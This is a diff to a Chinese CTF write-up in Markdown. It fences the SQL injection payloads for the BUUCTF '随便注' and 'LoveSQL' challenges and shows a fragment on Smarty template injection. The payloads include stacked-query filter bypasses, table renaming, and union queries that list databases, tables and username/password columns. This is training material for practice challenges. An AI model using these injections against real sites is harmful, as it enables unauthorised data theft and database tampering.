@@ -61,21 +61,21 @@
 [BUUCTF [强网杯 2019]随便注 1（两种方法）-CSDN博客](https://blog.csdn.net/m0_62879498/article/details/123292860)
 
 给出的答案如下：
-
+```
 -1';use supersqli;set @sql=concat('s','elect flag from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1-- q
-
+```
 通过自己尝试仿照答案实现的注入如下：
-
+```
 1';use supersqli;set @tmp=concat('s','elect flag from `1919810931114514`');PREPARE temp from @tmp;EXECUTE temp ;
-
+```
 或是通过修改表名的操作实现：
-
+```
 1';rename table words to word2;rename table `1919810931114514` to words;
 
 ALTER TABLE words ADD id int(10) DEFAULT '12';
 
 ALTER TABLE words CHANGE flag data VARCHAR(100);-- q
-
+```
 然后通过构造1' or 1=1;实现
 
 ### 总结：
@@ -101,31 +101,36 @@ ALTER TABLE words CHANGE flag data VARCHAR(100);-- q
 [[极客大挑战 2019]LoveSQL 1-CSDN博客](https://blog.csdn.net/satasun/article/details/106246493)
 
 username=admin' order by 4%23&password=1通过盲注可知没有第四列，即只有三列
-
+```
 /check.php?username=1' union select 1,2,3%23&password=1
-
+```
 通过下面的union查询测试回显点位，得到可进行操作的点位为2和3，因此，通过下面的语句查询数据库和版本：
-
+```
 /check.php?username=1' union select 1,database(),version()%23&password=1
-
+```
 通过这个语句获取当前所在的数据库中的表有哪些：
-
+```
 /check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
+```
 
 ![alt text](./img/lovesql查看表.jpg)
 
+```
 /check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=1
-
+```
 进一步查询指定的表中的列有哪些：
 
+```
 /check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=1
+```
 
 ![alt text](./img/lovesql查看列.jpg)
 可见在l0ve1ysq1这个表中有如上三个字段
 
 最后查询字段的内容：
-
+```
 /check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
+```
 
 ![alt text](./img/lovesql查看字段.jpg)
 
@@ -417,7 +422,7 @@ system('cmd')
 
 即得到了 `flag`
 
-![1740654251349](image/README/midlevel得到flag.jpg)
+![1740654251349](img/midlevel得到flag.jpg)
 
 还有一种方法利用的是`Smarty`的`{if}`标签，`{if}`标签可以在里面执行`php`代码，所以也可以将`XFF`的内容替换为下面的：
 
